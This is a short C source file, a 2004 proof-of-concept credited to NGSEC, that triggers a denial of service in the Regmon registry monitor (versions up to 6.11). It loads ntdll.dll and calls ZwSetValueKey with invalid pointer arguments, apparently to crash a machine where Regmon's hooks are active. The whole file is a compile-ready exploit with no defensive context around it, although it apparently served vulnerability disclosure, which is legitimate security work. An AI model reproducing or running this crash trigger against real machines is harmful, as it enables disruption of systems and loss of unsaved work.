/*
 *  ntregmon-dos.c (up to 6.11)
 *
 *  Copyright (c) 2002-2004 By Next Generation Security S.L.
 *  All rights reserved
 *  http://www.ngsec.com
 *
 *  Compiles with: cl ntregmon-dos.c
 *
 *  Madrid, August 2004
 */

#include <windows.h>

#define MY_NULL 0x01
typedef DWORD (* zwsetvaluekey_TYPE)(DWORD KeyHandle, DWORD ValueName, DWORD TitleIndex, DWORD Type, DWORD Data, DWORD DataSize);


int main(int argc, char *argv[]) {
HINSTANCE dll;
zwsetvaluekey_TYPE my_ZwSetValueKey;

  if ((dll=LoadLibrary("ntdll.dll"))!=NULL) {

     if ((my_ZwSetValueKey=(zwsetvaluekey_TYPE)GetProcAddress(dll,"ZwSetValueKey"))!=NULL) {

         my_ZwSetValueKey(MY_NULL,MY_NULL,MY_NULL,MY_NULL,MY_NULL,MY_NULL);

     }
  }

}
